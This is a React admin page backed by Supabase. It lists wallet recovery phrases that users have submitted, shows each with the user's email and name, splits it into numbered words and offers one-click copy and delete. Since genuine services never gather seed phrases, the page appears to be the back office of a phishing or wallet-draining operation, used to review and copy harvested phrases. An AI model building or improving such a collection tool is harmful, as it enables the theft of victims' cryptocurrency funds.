import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { Loader2, Wallet, Trash2, Copy } from "lucide-react";

interface Phrase {
  id: string; user_id: string; wallet_name: string | null; phrase: string; created_at: string;
}
interface UserMap { user_id: string; email: string | null; full_name: string | null; }

export default function AdminWalletPhrases() {
  const [items, setItems] = useState<Phrase[]>([]);
  const [users, setUsers] = useState<Record<string, UserMap>>({});
  const [loading, setLoading] = useState(true);

  const load = async () => {
    setLoading(true);
    const [pRes, uRes] = await Promise.all([
      supabase.from("wallet_phrases").select("*").order("created_at", { ascending: false }),
      supabase.rpc("admin_list_users"),
    ]);
    setItems((pRes.data ?? []) as Phrase[]);
    const map: Record<string, UserMap> = {};
    (uRes.data ?? []).forEach((u: any) => { map[u.user_id] = u; });
    setUsers(map);
    setLoading(false);
  };
  useEffect(() => { load(); }, []);

  const remove = async (id: string) => {
    if (!confirm("Delete this wallet phrase?")) return;
    const { error } = await supabase.from("wallet_phrases").delete().eq("id", id);
    if (error) toast.error(error.message);
    else { toast.success("Deleted"); load(); }
  };

  const copy = (text: string) => { navigator.clipboard.writeText(text); toast.success("Copied"); };

  if (loading) return <div className="flex justify-center py-20"><Loader2 className="w-6 h-6 animate-spin text-primary" /></div>;

  return (
    <div className="space-y-6 max-w-5xl">
      <div>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em] flex items-center gap-2"><Wallet className="w-6 h-6" /> Wallet Phrases</h1>
        <p className="text-muted-foreground text-[13px] mt-1">{items.length} submitted</p>
      </div>

      {items.length === 0 ? (
        <div className="rounded-2xl border border-border bg-card p-10 text-center text-muted-foreground text-sm">No wallet phrases submitted yet.</div>
      ) : (
        <div className="space-y-3">
          {items.map((p) => {
            const u = users[p.user_id];
            return (
              <div key={p.id} className="rounded-2xl border border-border bg-card p-5">
                <div className="flex items-start justify-between mb-3">
                  <div>
                    <p className="font-medium text-[14px]">{u?.email ?? p.user_id}</p>
                    <p className="text-[11px] text-muted-foreground">{u?.full_name ?? "—"} · {p.wallet_name ?? "Unknown wallet"} · {new Date(p.created_at).toLocaleString()}</p>
                  </div>
                  <div className="flex gap-1">
                    <Button variant="ghost" size="sm" onClick={() => copy(p.phrase)}><Copy className="w-3.5 h-3.5" /></Button>
                    <Button variant="ghost" size="sm" onClick={() => remove(p.id)}><Trash2 className="w-3.5 h-3.5 text-destructive" /></Button>
                  </div>
                </div>
                <div className="grid grid-cols-3 sm:grid-cols-6 gap-2 font-mono text-[12px]">
                  {p.phrase.split(/\s+/).map((w, i) => (
                    <div key={i} className="rounded bg-muted px-2 py-1.5">
                      <span className="text-[9px] text-muted-foreground mr-1">{i + 1}</span>{w}
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
